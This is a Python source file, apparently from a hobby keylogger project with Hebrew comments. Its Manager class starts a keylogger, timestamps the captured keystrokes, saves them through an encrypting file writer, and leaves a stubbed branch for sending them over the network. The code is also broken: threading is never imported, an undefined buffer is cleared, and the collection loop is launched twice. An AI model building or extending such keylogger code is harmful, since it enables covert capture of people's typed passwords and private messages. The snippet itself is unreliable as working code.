import time
import datetime
from kyllog import MeinKeylogger
from FileWriter import FileWriter

class Manager:

    def __init__(self, time, encryption_key=123):
        self.time = time
        self.keylogger = MeinKeylogger()
        self.file_writer = FileWriter(encryption_key=encryption_key)  # העברת מפתח הצפנה ל-FileWriter
        self.running = False

    def collect_keys(self):
        while self.running:
            try:
                time.sleep(self.time)
                logged_keys = self.keylogger.get_logged_keys()
                if logged_keys:
                    timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
                    data = {timestamp: logged_keys}

                    # שליחה לקובץ (הצפנה מתבצעת בתוך FileWriter)
                    self.file_writer.Writes_to_file(data)

                    # שליחה לרשת
                    if self.file_writer.Writes_to_network:
                        pass

                    # ניקוי
                    self.buffer.clear()
            except Exception as e:
                print(f"Error collecting keystrokes: {e}")

    def start(self):
        self.running = True
        self.keylogger.start_logging()
        threading.Thread(target=self.collect_keys, daemon=True).start()
        self.collect_keys()

    def stop(self):
        self.running = False
        self.keylogger.stop_logging()


